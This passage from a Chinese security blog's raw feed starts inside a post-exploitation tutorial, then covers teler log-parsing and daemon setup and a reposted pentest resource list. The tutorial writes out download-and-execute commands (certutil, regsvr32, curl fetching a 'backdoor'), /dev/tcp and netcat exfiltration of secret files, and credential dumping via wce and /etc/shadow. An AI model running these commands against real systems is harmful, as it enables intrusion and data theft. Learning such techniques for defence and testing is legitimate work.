&gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.SaveToFile &quot;<span class="hljs-built_in">help</span>.exe&quot;,<span class="hljs-number">2</span> &gt;&gt;<span class="hljs-number">1</span>.vbs</code></pre></div><h4 id="在-FTP-命令模式下下载。"><a href="#在-FTP-命令模式下下载。" class="headerlink" title="在 FTP 命令模式下下载。"></a>在 FTP 命令模式下下载。</h4><p>down.bat 内容如下。</p><div class="hljs code-wrapper"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off @<span class="hljs-built_in">set</span> temp=C:\script.txt <span class="hljs-built_in">echo</span> open <span class="hljs-number">10</span>.<span class="hljs-number">229</span>.<span class="hljs-number">23</span>.<span class="hljs-number">77</span>&gt;&gt;<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">echo</span> ftpuser&gt;&gt;<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">echo</span> ftpuser&gt;&gt;<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">echo</span> <span class="hljs-built_in">cd</span> General&gt;&gt;<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">echo</span> lcd <span class="hljs-variable">%2&gt;&gt;%</span>temp% <span class="hljs-built_in">echo</span> get <span class="hljs-variable">%1&gt;&gt;%</span>temp% <span class="hljs-built_in">echo</span> quit&gt;&gt;<span class="hljs-variable">%temp%</span> @ftp -s:<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">del</span> <span class="hljs-variable">%temp%</span></code></pre></div><p>执行命令“down.bat filename C:\”，参数 1 是要下载的文件名，参数 2 是下载的目标路径。使用 同样的方法也可以实现文件上传。</p><h4 id="TFTP文件下载"><a href="#TFTP文件下载" class="headerlink" title="TFTP文件下载"></a>TFTP文件下载</h4><p>Windows Vista和更低版本中默认情况下带有琐碎的FTP。请注意，您将必须设置要连接的相应服务器。可以使用以下命令运行它：</p><h4 id="使用-certutil"><a href="#使用-certutil" class="headerlink" title="使用 certutil"></a>使用 certutil</h4><p>下载并执行:</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">certutil -urlcache -split -f http://<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span>/<span class="hljs-number">5</span>.exe c:\download\a.exe&amp;&amp;c:\download\a.exe</code></pre></div><h4 id="使用-regsvr32"><a href="#使用-regsvr32" class="headerlink" title="使用 regsvr32"></a>使用 regsvr32</h4><div class="hljs code-wrapper"><pre><code class="hljs awk">regsvr32 <span class="hljs-regexp">/u /</span>s <span class="hljs-regexp">/i:http:/</span><span class="hljs-regexp">/1.2.3.4/</span><span class="hljs-number">5</span>.exe scrobj.dll</code></pre></div><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="使用-wget（linux）"><a href="#使用-wget（linux）" class="headerlink" title="使用 wget（linux）"></a>使用 wget（linux）</h4><p>在 Linux 下，通过“wget <a href="http://www.antian365.com/shell.txt%E2%80%9D%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD">http://www.antian365.com/shell.txt”命令下载</a> shell.txt 文件到本地服务器。 </p><h4 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h4><div class="hljs code-wrapper"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">1.2</span>.<span class="hljs-number">3.4</span>/backdoor</code></pre></div><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><div class="hljs code-wrapper"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN &#123;</span><span class="hljs-string">  RS = ORS = &quot;\r\n&quot;</span><span class="hljs-string">  HTTPCon = &quot;/inet/tcp/0/127.0.0.1/1337&quot;</span><span class="hljs-string">  print &quot;GET /secret.txt HTTP/1.1\r\nConnection: close\r\n&quot;    |&amp; HTTPCon</span><span class="hljs-string">  while (HTTPCon |&amp; getline &gt; 0)</span><span class="hljs-string">      print $0</span><span class="hljs-string">  close(HTTPCon)</span><span class="hljs-string">&#125;&#x27;</span></code></pre></div><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="使用-Bash-dev-tcp-进行文件传输"><a href="#使用-Bash-dev-tcp-进行文件传输" class="headerlink" title="使用 Bash /dev/tcp 进行文件传输"></a>使用 Bash /dev/tcp 进行文件传输</h4><p>文件接收端:</p><div class="hljs code-wrapper"><pre><code class="hljs sh">nc -lvnp 1337 &gt; secret.txt</code></pre></div><p>文件发送端:</p><div class="hljs code-wrapper"><pre><code class="hljs sh">cat secret.txt &gt; /dev/tcp/ip/port</code></pre></div><h4 id="使用-NetCat-进行文件传输"><a href="#使用-NetCat-进行文件传输" class="headerlink" title="使用 NetCat 进行文件传输"></a>使用 NetCat 进行文件传输</h4><p>接受端:</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">1337</span> &gt; <span class="hljs-number">1</span>.txt</code></pre></div><p>发送端：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> <span class="hljs-number">1</span>.txt | nc -l -p <span class="hljs-number">1337</span></code></pre></div><p>或者</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.10.10.200</span> <span class="hljs-number">1337</span> &lt; <span class="hljs-number">1</span>.txt</code></pre></div><p>在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件:</p><div class="hljs code-wrapper"><pre><code class="hljs awk">cat &lt; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.10.200/</span><span class="hljs-number">1337</span> &gt; <span class="hljs-number">1</span>.txt</code></pre></div><h4 id="使用-dig-命令进行文件传输"><a href="#使用-dig-命令进行文件传输" class="headerlink" title="使用 dig 命令进行文件传输"></a>使用 dig 命令进行文件传输</h4><h4 id="使用-ping-命令进行文件传输"><a href="#使用-ping-命令进行文件传输" class="headerlink" title="使用 ping 命令进行文件传输"></a>使用 ping 命令进行文件传输</h4><h4 id="使用-whois-命令进行文件传输"><a href="#使用-whois-命令进行文件传输" class="headerlink" title="使用 whois 命令进行文件传输"></a>使用 whois 命令进行文件传输</h4><h4 id="利用HTTP-Server-进行文件传输"><a href="#利用HTTP-Server-进行文件传输" class="headerlink" title="利用HTTP Server 进行文件传输"></a>利用HTTP Server 进行文件传输</h4><p>具体参考：<a href="https://paper.seebug.org/834/#download-files-from-http-server">红队后渗透测试中的文件传输技巧</a>.</p><p>还有很多关于上传下载文件的好文章我放在参考链接处了。</p><h2 id="2-执行-0day-进行提权尝试"><a href="#2-执行-0day-进行提权尝试" class="headerlink" title="2. 执行 0day 进行提权尝试"></a>2. 执行 0day 进行提权尝试</h2><p>在 WebShell 状态下执行提权 0day。通常通过 0day 添加普通用户为管理员，或者通过 0day 执行 其他可执行程序（例如木马、系统密码获取工具等）。</p><h2 id="3-获取系统权限及操作系统的密码"><a href="#3-获取系统权限及操作系统的密码" class="headerlink" title="3. 获取系统权限及操作系统的密码"></a>3. 获取系统权限及操作系统的密码</h2><p>使用密码获取软件获取操作系统的密码。例如，“使用 wce –w”命令获取 Windows 系统当前登 录的明文密码，使用“cat /etc/shadow”命令获取 Linux 操作系统 Shadow 文件的内容。</p><h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><ul><li>《网络攻防实战研究：漏洞利用与提权》</li><li><a href="https://paper.seebug.org/834/#download-files-from-http-server">红队后渗透测试中的文件传输技巧</a></li><li><a href="https://wooyun.js.org/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html">渗透技巧——通过cmd上传文件的N种方法</a></li><li><a href="https://blog.netspi.com/15-ways-to-download-a-file/">15 Ways to Download a File</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>提权</tag>
      
      <tag>上传</tag>
      
      <tag>下载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>teler 坑一：日志格式解析坑</title>
    <link href="/2021/03/13/teler-%E5%9D%91%E4%B8%80%EF%BC%9A%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90%E5%9D%91/"/>
    <url>/2021/03/13/teler-%E5%9D%91%E4%B8%80%EF%BC%9A%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="teler-坑一：日志格式解析坑"><a href="#teler-坑一：日志格式解析坑" class="headerlink" title="teler 坑一：日志格式解析坑"></a>teler 坑一：日志格式解析坑</h1><p>我尝试使用如下的日志格式，加入$request_body</p><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">log_format</span>  main  <span class="hljs-string">&#x27;$remote_addr $remote_user - [$time_iso8601] &quot;$request&quot; &#x27;</span>                  <span class="hljs-string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span>                  <span class="hljs-string">&#x27;&quot;$http_user_agent&quot; &quot;$request_body&quot; &#x27;</span>;</code></pre></div><p>我使用如下格式的若干数据进行测试</p><div class="hljs code-wrapper"><pre><code class="hljs nginx">192.168.68.129 - - [2021-03-11T01:31:26+00:00] &quot;POST /index.php HTTP/1.1&quot; 404 287 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot; &quot;id=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%7bFILE%7d&amp;name=111asdasdaasd&quot;</code></pre></div><p>teler.yaml</p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">log_format:</span> <span class="hljs-string">|</span>  <span class="hljs-string">$remote_addr</span> <span class="hljs-string">$remote_user</span> <span class="hljs-bullet">-</span> [<span class="hljs-string">$time_local</span>] <span class="hljs-string">&quot;$request_method $request_uri $request_protocol&quot;</span>   <span class="hljs-string">$status</span> <span class="hljs-string">$body_bytes_sent</span> <span class="hljs-string">&quot;$http_referer&quot;</span> <span class="hljs-string">&quot;$http_user_agent&quot;</span> <span class="hljs-string">&quot;$request_body&quot;</span></code></pre></div><p>直接解析不到</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210311093400339.png" alt="image-20210311093400339"></p><p>当我在nginx logfomat中加了一个无用的结尾字符 - </p><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">log_format</span>  main  <span class="hljs-string">&#x27;$remote_addr $remote_user - [$time_iso8601] &quot;$request&quot; &#x27;</span>                  <span class="hljs-string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span>                  <span class="hljs-string">&#x27;&quot;$http_user_agent&quot; &quot;$request_body&quot; -&#x27;</span>;</code></pre></div><p>然后再在teler.yaml 中加入一个无用的变量</p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">log_format:</span> <span class="hljs-string">|</span>  <span class="hljs-string">$remote_addr</span> <span class="hljs-string">$remote_user</span> <span class="hljs-bullet">-</span> [<span class="hljs-string">$time_local</span>] <span class="hljs-string">&quot;$request_method $request_uri $request_protocol&quot;</span>   <span class="hljs-string">$status</span> <span class="hljs-string">$body_bytes_sent</span> <span class="hljs-string">&quot;$http_referer&quot;</span> <span class="hljs-string">&quot;$http_user_agent&quot;</span> <span class="hljs-string">&quot;$request_body&quot;</span> <span class="hljs-string">$x</span></code></pre></div><p>它就能解析并打印出结果了</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210311093720964.png" alt="image-20210311093720964"></p>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
      <category>teler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>teler</tag>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>teler守护进程化思路</title>
    <link href="/2021/03/13/teler%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E5%8C%96%E6%80%9D%E8%B7%AF/"/>
    <url>/2021/03/13/teler%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E5%8C%96%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="teler守护进程化思路"><a href="#teler守护进程化思路" class="headerlink" title="teler守护进程化思路"></a>teler守护进程化思路</h1><h2 id="思路一：利用disown"><a href="#思路一：利用disown" class="headerlink" title="思路一：利用disown"></a>思路一：利用disown</h2><p>teler如果能够成为后台守护进程就好了，经过尝试，可以使用 disown实现。</p><p>需要将对终端的输出屏蔽掉。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">tail -f /var/<span class="hljs-built_in">log</span>/nginx/access.log | teler -c teler.yaml  -o ./result.json --json &gt; /dev/null 2&gt;&amp;1  &amp;<span class="hljs-built_in">disown</span></code></pre></div><p>nohup应该也可以实现，但是不知道为什么没有效果。</p><p>可以使用jobs查看当前终端下的任务：</p><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">jobs</span></code></pre></div><p>执行完上面两条再执行jobs就看不到任务了。</p><p>在使用ps aux查看。可以看到teler进程</p><div class="hljs code-wrapper"><pre><code class="hljs sh">ps aux</code></pre></div><h2 id="思路二：利用docker后台运行功能"><a href="#思路二：利用docker后台运行功能" class="headerlink" title="思路二：利用docker后台运行功能"></a>思路二：利用docker后台运行功能</h2><p>docker-compose 中-d参数可以使容器在后台运行，恰好满足要求。下面是我编写的docker-compose.yml以及Dockerfile</p><div class="hljs code-wrapper"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;2.3&#x27;</span><span class="hljs-attr">services:</span>   <span class="hljs-attr">teler:</span>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">teler_analysis</span>    <span class="hljs-attr">build:</span>      <span class="hljs-attr">context:</span> <span class="hljs-string">.</span>    <span class="hljs-attr">volumes:</span>       <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./teler.yaml:/teler.yaml&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./access.log:/access.log&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./teler-resources/:/.cache/teler-resources/&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./start.sh:/start.sh&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./result.json:/result.json&quot;</span>    <span class="hljs-attr">entrypoint:</span> <span class="hljs-string">/bin/sh</span>    <span class="hljs-attr">command:</span> <span class="hljs-string">/start.sh</span>    <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span></code></pre></div><ul><li>将配置文件、日志文件、teler缓存文件、输出结果文件以镜像的方式放入</li><li>start.sh写入我们要执行的命令</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span>tail -f /access.log | teler -c /teler.yaml --json -o result.json</code></pre></div><p>运行：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">docker-compose up --build -d</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210310084716707.png" alt="image-20210310084716707"></p><p>result.json中随即产生输出</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210310084742467.png" alt="image-20210310084742467"></p><p>进入</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210310084817175.png" alt="image-20210310084817175"></p>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
      <category>teler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>teler</tag>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux 学习资料汇总</title>
    <link href="/2021/03/13/linux-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/"/>
    <url>/2021/03/13/linux-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>汇总平时遇到的linux问题与解决参考文献</p><ul><li><a href="http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html">Linux 守护进程的启动方法</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>资料收集</category>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>后台守护进程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转载】渗透测试资源合集</title>
    <link href="/2021/03/10/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%B5%84%E6%BA%90%E5%90%88%E9%9B%86/"/>
    <url>/2021/03/10/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%B5%84%E6%BA%90%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="【转载】渗透测试资源合集"><a href="#【转载】渗透测试资源合集" class="headerlink" title="【转载】渗透测试资源合集"></a>【转载】渗透测试资源合集</h1><p>发表于<a href="https://qqsec.com/2021/03/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%B5%84%E6%BA%90%E5%90%88%E9%9B%86.html">2021年3月9日</a>由<a href="https://qqsec.com/author/whoami">蒙学堂</a></p><p><a href="https://en.wikipedia.org/wiki/Penetration_test">渗透测试</a>是针对计算机系统及其物理基础架构启动授权的模拟攻击以暴露潜在的安全漏洞和漏洞的做法。令人敬畏的渗透测试 :一系列令人敬畏的渗透测试资源。该项目由Netsparker Web应用程序安全扫描程序提供支持。有关详细信息，请查看“ <a href="https://github.com/premepen/pen-tools/blob/master/enaqx/awesome-pentest/blob/master/CONTRIBUTING.md">贡献指南”</a>。本作品采用<a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名4.0国际许可协议授权</a>。</p><h2 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源"></a>在线资源</h2><h3 id="渗透测试资源"><a href="#渗透测试资源" class="headerlink" title="渗透测试资源"></a>渗透测试资源</h3><ul><li><a href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit Unleashed</a> – 免费进攻性安全Metasploit课程。</li><li><a href="http://www.pentest-standard.org/">渗透测试执行标准（PTES）</a> – 旨在提供执行和报告渗透测试结果的通用语言和范围的文档。</li><li><a href="https://www.owasp.org/index.php/Main_Page">开放式Web应用安全项目（OWASP）</a> – 全球非营利性慈善组织，致力于提高特别是基于Web和应用层软件的安全性。</li><li><a href="https://github.com/nixawk/pentest-wiki">PENTEST-WIKI</a> – 免费在线安全知识库供测试者和研究人员使用。</li><li>[渗透测试框架（PTF）](<a href="http://www.vulnerabilityassessment.co.uk/Penetration">http://www.vulnerabilityassessment.co.uk/Penetration</a> Test.html) – 执行渗透测试的大纲，编译为漏洞分析师和渗透测试人员都可使用的一般框架。</li><li><a href="http://www.xss-payloads.com/">XSS-Payloads</a> – 跨站点所有内容的终极资源，包括有效负载，工具，游戏和文档。</li><li><a href="https://attack.mitre.org/">MITRE的对抗策略，技术和常识（ATT＆CK）</a> – 针对网络对手行为的策划知识库和模型。</li><li><a href="http://resources.infosecinstitute.com/">InfoSec Institute</a> – IT和安全训练营。</li></ul><h3 id="利用开发"><a href="#利用开发" class="headerlink" title="利用开发"></a>利用开发</h3><ul><li><a href="http://www.vividmachines.com/shellcode/shellcode.html">Shellcode教程</a> – 关于如何编写shellcode的教程。</li><li><a href="http://shell-storm.org/shellcode/">Shellcode示例</a> – Shellcodes数据库。</li><li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Exploit Writing Tutorials</a> – 关于如何开发漏洞利用的教程。</li></ul><h3 id="开源智能（OSINT）资源"><a href="#开源智能（OSINT）资源" class="headerlink" title="开源智能（OSINT）资源"></a>开源智能（OSINT）资源</h3><ul><li><a href="http://osintframework.com/">OSINT Framework</a> – 按类别划分的各种OSINT工具的集合。</li><li><a href="https://inteltechniques.com/menu.html">英特尔技术</a> – OSINT工具的集合。左侧的菜单可用于浏览类别。</li><li><a href="http://netbootcamp.org/osinttools/">NetBootcamp OSINT工具</a> – OSINT链接的集合和其他服务的自定义Web界面。</li><li><a href="https://wigle.net/">WiGLE.net</a> – 有关全球无线网络的信息，具有用户友好的桌面和Web应用程序。</li><li><a href="https://github.com/lanrat/certgraph">CertGraph</a> – 为其证书替代名称<a href="https://github.com/lanrat/certgraph">抓取</a>域的SSL / TLS证书。</li><li><a href="https://ghostproject.fr/">GhostProject</a> – 可搜索的数十亿明文密码数据库，部分可见免费。</li></ul><h3 id="社会工程资源"><a href="#社会工程资源" class="headerlink" title="社会工程资源"></a>社会工程资源</h3><ul><li><a href="http://www.social-engineer.org/framework/general-discussion/">社会工程框架</a> – 社会工程师的信息资源。</li></ul><h3 id="锁定拣选资源"><a href="#锁定拣选资源" class="headerlink" title="锁定拣选资源"></a>锁定拣选资源</h3><ul><li><a href="https://www.youtube.com/user/SchuylerTowne/">Schuyler Towne频道</a> – 开启视频和安全会谈。</li><li><a href="https://www.youtube.com/user/bosnianbill">bosnianbill</a> – 更多的开锁视频。</li><li><a href="https://www.reddit.com/r/lockpicking">/ r / lockpicking</a> – 学习开锁的资源，设备建议。</li></ul><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><ul><li><a href="http://list.rawsec.ml/operating_systems.html">与安全相关的操作系统@ Rawsec</a> – 与安全相关的操作系统的完整列表。</li><li><a href="https://distrowatch.com/search.php?category=Security">Security @ Distrowatch</a> – 致力于讨论，审查和跟上开源操作系统的网站。</li><li><a href="https://github.com/cuckoosandbox/cuckoo">cuckoo</a> – 开源自动恶意软件分析系统。</li><li><a href="http://www.deftlinux.net/">数字证据与取证工具包（DEFT）</a> – 用于取证分析的Live CD可在不篡改或破坏引导过程发生的连接设备的情况下运行。</li><li><a href="https://digital-forensics.sans.org/community/downloads">SIFT</a> – SANS制造的法医工作站。</li><li><a href="https://tails.boum.org/">Tails</a> – Live OS旨在保护隐私和匿名。</li><li><a href="https://www.qubes-os.org/">Qubes OS</a> – 高安全性操作系统，提供严格的应用程序隔离。</li></ul><h3 id="渗透测试报告模板"><a href="#渗透测试报告模板" class="headerlink" title="渗透测试报告模板"></a>渗透测试报告模板</h3><ul><li><a href="https://github.com/juliocesarfort/public-pentesting-reports">公共色情</a>测试报告 – 由多家咨询公司和学术安全组织发布的公开渗透测试报告的<a href="https://github.com/juliocesarfort/public-pentesting-reports">精选</a>列表。</li><li><a href="https://www.testandverification.com/wp-content/uploads/template-penetration-testing-report-v03.pdf">T＆VS Pentesting报告模板</a> – 由Test and Verification Services，Ltd。提供的Pentest报告模板</li><li><a href="http://lucideus.com/pdf/stw.pdf">Web应用程序安全评估报告模板</a> – Lucideus提供的示例Web应用程序安全评估报告模板。</li></ul><h3 id="渗透测试的代码示例"><a href="#渗透测试的代码示例" class="headerlink" title="渗透测试的代码示例"></a>渗透测试的代码示例</h3><ul><li><a href="https://github.com/dreddsa5dies/goHackTools">goHackTools</a> – Go上的黑客工具（Golang）。</li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="渗透测试分布"><a href="#渗透测试分布" class="headerlink" title="渗透测试分布"></a>渗透测试分布</h3><ul><li><a href="https://www.kali.org/">Kali</a> – GNU / Linux发行版，专为数字取证和渗透测试而设计。</li><li><a href="https://archstrike.org/">ArchStrike</a> – 为安全专业人士和爱好者提供Arch GNU / Linux存储库。</li><li><a href="https://www.blackarch.org/">BlackArch</a> – 基于GNU / Linux的渗透测试人员和安全研究人员。</li><li><a href="http://networksecuritytoolkit.org/">Network Security Toolkit（NST）</a> – 基于Fedora的可启动实时操作系统，旨在提供对最佳开源网络安全应用程序的轻松访问。</li><li><a href="https://backbox.org/">BackBox</a> – 基于Ubuntu的渗透测试和安全评估分发。</li><li><a href="https://www.parrotsec.org/">Parrot</a> – 分布类似于Kali，具有多种架构。</li><li><a href="https://inteltechniques.com/buscador/">Buscador</a> – 为在线调查员预先配置的GNU / Linux虚拟机。</li><li><a href="https://github.com/trustedsec/ptf">Pentesters Framework</a> – Distro围绕渗透测试执行标准（PTES）进行组织，提供了一系列实用工具，可以消除经常使用的工具链。</li><li><a href="https://github.com/adi0x90/attifyos">AttifyOS</a> – GNU / Linux发行版专注于物联网（IoT）安全评估中有用的工具。</li><li><a href="https://pentestbox.org/">PentestBox</a> – 用于Windows操作系统的Opensource预配置便携式渗透测试环境。</li><li><a href="https://androidtamer.com/">Android Tamer</a> – 适用于Android安全专业人员的操作系统。包括Android安全测试所需的所有工具。</li></ul><h3 id="用于渗透测试的DOCKER"><a href="#用于渗透测试的DOCKER" class="headerlink" title="用于渗透测试的DOCKER"></a>用于渗透测试的DOCKER</h3><ul><li><code>docker pull kalilinux/kali-linux-docker</code>– <a href="https://hub.docker.com/r/kalilinux/kali-linux-docker/">官方Kali Linux</a>。</li><li><code>docker pull owasp/zap2docker-stable</code>– <a href="https://github.com/zaproxy/zaproxy">官方OWASP ZAP</a>。</li><li><code>docker pull wpscanteam/wpscan</code>– <a href="https://hub.docker.com/r/wpscanteam/wpscan/">官方WPScan</a>。</li><li><code>docker pull citizenstig/dvwa</code>– <a href="https://hub.docker.com/r/citizenstig/dvwa/">该死的易受攻击的Web应用程序（DVWA）</a>。</li><li><code>docker pull wpscanteam/vulnerablewordpress</code>– <a href="https://hub.docker.com/r/wpscanteam/vulnerablewordpress/">易受攻击的WordPress安装</a>。</li><li><code>docker pull hmlio/vaas-cve-2014-6271</code>– <a href="https://hub.docker.com/r/hmlio/vaas-cve-2014-6271/">漏洞即服务：Shellshock</a>。</li><li><code>docker pull hmlio/vaas-cve-2014-0160</code>– <a href="https://hub.docker.com/r/hmlio/vaas-cve-2014-0160/">作为服务的漏洞：Heartbleed</a>。</li><li><code>docker pull vulnerables/cve-2017-7494</code>– <a href="https://hub.docker.com/r/vulnerables/cve-2017-7494/">作为服务的漏洞：SambaCry</a>。</li><li><code>docker pull opendns/security-ninjas</code>– <a href="https://hub.docker.com/r/opendns/security-ninjas/">安全忍者</a>。</li><li><code>docker pull diogomonica/docker-bench-security</code>– <a href="https://hub.docker.com/r/diogomonica/docker-bench-security/">Docker Bench for Security</a>。</li><li><code>docker pull ismisepaul/securityshepherd</code>– <a href="https://hub.docker.com/r/ismisepaul/securityshepherd/">OWASP安全牧羊人</a>。</li><li><code>docker pull webgoat/webgoat-7.1</code>– <a href="https://hub.docker.com/r/webgoat/webgoat-7.1/">OWASP WebGoat Project 7.1泊坞窗图像</a>。</li><li><code>docker pull webgoat/webgoat-8.0</code>– <a href="https://hub.docker.com/r/webgoat/webgoat-8.0/">OWASP WebGoat Project 8.0泊坞窗图像</a>。</li><li><code>docker-compose build &amp;&amp; docker-compose up</code>– <a href="https://github.com/owasp/nodegoat#option-3---run-nodegoat-on-docker">OWASP NodeGoat</a>。</li><li><code>docker pull citizenstig/nowasp</code>– <a href="https://hub.docker.com/r/citizenstig/nowasp/">OWASP Mutillidae II Web笔测试实践应用</a>。</li><li><code>docker pull bkimminich/juice-shop</code>– <a href="https://github.com/bkimminich/juice-shop#docker-container--">OWASP果汁店</a>。</li><li><code>docker pull phocean/msf</code>– <a href="https://hub.docker.com/r/phocean/msf/">docker-metasploit</a>。</li></ul><h3 id="多范式框架"><a href="#多范式框架" class="headerlink" title="多范式框架"></a>多范式框架</h3><ul><li><a href="https://www.metasploit.com/">Metasploit</a> – 用于攻击性安全团队的软件，用于帮助验证漏洞和管理安全评估。</li><li><a href="http://fastandeasyhacking.com/">Armitage</a> – Metasploit框架的基于Java的GUI前端。</li><li><a href="https://github.com/infobyte/faraday">法拉第</a> – 为红队执行合作渗透测试，安全审计和风险评估的多用户集成测试环境。</li><li><a href="https://github.com/juansacco/exploitpack">ExploitPack</a> – 用于自动化渗透测试的图形工具，附带许多预打包的漏洞。</li><li><a href="https://github.com/n1nj4sec/pupy">Pupy</a> – 跨平台（Windows，Linux，macOS，Android）远程管理和后期开发工具。</li><li><a href="https://github.com/NullArray/AutoSploit">AutoSploit</a> – 自动大规模开发者，通过使用Shodan.io API收集目标，并以编程方式选择基于Shodan查询的Metasploit漏洞利用模块。</li><li><a href="https://github.com/stevenaldinger/decker">Decker</a> – Penetration测试编排和自动化框架，它允许编写声明性的，可重用的配置，能够摄取变量并使用它作为输入运行的工具的输出。</li></ul><h3 id="网络漏洞扫描程序"><a href="#网络漏洞扫描程序" class="headerlink" title="网络漏洞扫描程序"></a>网络漏洞扫描程序</h3><ul><li><a href="https://www.netsparker.com/">Netsparker应用程序安全扫描程序</a> – 应用程序安全扫描程序自动查找安全漏洞。</li><li><a href="https://www.rapid7.com/products/nexpose/">Nexpose</a> – 商业漏洞和风险管理评估引擎，与Rapid7销售的Metasploit集成。</li><li><a href="https://www.tenable.com/products/nessus-vulnerability-scanner">Nessus</a> – 由Tenable销售的商业漏洞管理，配置和合规性评估平台。</li><li><a href="http://www.openvas.org/">OpenVAS</a> – 流行的Nessus漏洞评估系统的免费软件实现。</li><li><a href="https://github.com/future-architect/vuls">Vuls</a> – 用于GNU / Linux和FreeBSD的无代理漏洞扫描程序，用Go编写。</li></ul><h4 